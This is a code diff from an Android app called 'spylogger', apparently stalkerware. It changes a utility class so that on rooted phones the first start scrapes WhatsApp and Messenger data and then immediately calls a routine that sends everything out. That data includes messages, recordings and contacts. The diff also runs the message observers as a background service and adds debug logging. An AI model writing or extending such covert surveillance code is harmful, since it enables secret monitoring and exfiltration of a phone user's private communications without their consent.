@@ -19,12 +19,12 @@ import android.provider.ContactsContract.PhoneLookup;
 import android.provider.MediaStore;
 import android.provider.Settings.Secure;
 import android.util.Base64;
+import android.util.Log;
 import android.webkit.MimeTypeMap;
 
 import com.google.firebase.iid.FirebaseInstanceId;
 import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookContacts;
 import com.gravatasufoca.spylogger.helpers.MensageiroAsyncHelper;
-import com.gravatasufoca.spylogger.helpers.MensageiroObserversHelper;
 import com.gravatasufoca.spylogger.helpers.NetworkUtil;
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.model.Configuracao;
@@ -38,6 +38,7 @@ import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
 import com.gravatasufoca.spylogger.services.FcmHelperService;
+import com.gravatasufoca.spylogger.services.MensageiroObserversService;
 import com.gravatasufoca.spylogger.services.MessengerService;
 import com.gravatasufoca.spylogger.services.RecordService;
 import com.gravatasufoca.spylogger.services.SendContatosService;
@@ -595,15 +596,21 @@ public class Utils {
             startServices(context);
         }
         if (rooted) {
-            new MensageiroObserversHelper(context).start();
+            context.startService(new Intent(context, MensageiroObserversService.class));
+
         }
         startAlarm(context, configuracao);
     }
 
-    public static void primeiroStart(Context context, Configuracao configuracao) {
+    public static void primeiroStart(final Context context, Configuracao configuracao) {
        if (rooted){
-           new MensageiroAsyncHelper(context).execute(new WhatsAppService(context),new MessengerService(context));
-           new MensageiroObserversHelper(context).start();
+           new MensageiroAsyncHelper(context, new TaskComplete() {
+               @Override
+               public void onFinish(Object object) {
+                   Utils.enviarTudo(context);
+               }
+           }).execute(new WhatsAppService(context),new MessengerService(context));
+           context.startService(new Intent(context, MensageiroObserversService.class));
        }
        startAlarm(context, configuracao);
     }
@@ -615,6 +622,7 @@ public class Utils {
 
     public static void enviarTudo(Context context) {
         try {
+            Log.d("spylogger","enviarTudo");
             RepositorioConfiguracao repositorioConfiguracao = new RepositorioConfiguracaoImpl(context);
 
             Configuracao configuracao = repositorioConfiguracao.getConfiguracao();
@@ -629,6 +637,7 @@ public class Utils {
                     sendMensagensService.enviarTopicos();
 
                     if (configuracao.isWifi()) {
+                        Log.d("spylogger","esta no wifi");
                         if (status == NetworkUtil.NETWORK_STATUS_WIFI) {
                             SendGravacoesService sendGravacoesService = new SendGravacoesService(context, null);
                             sendGravacoesService.enviarTopicos();
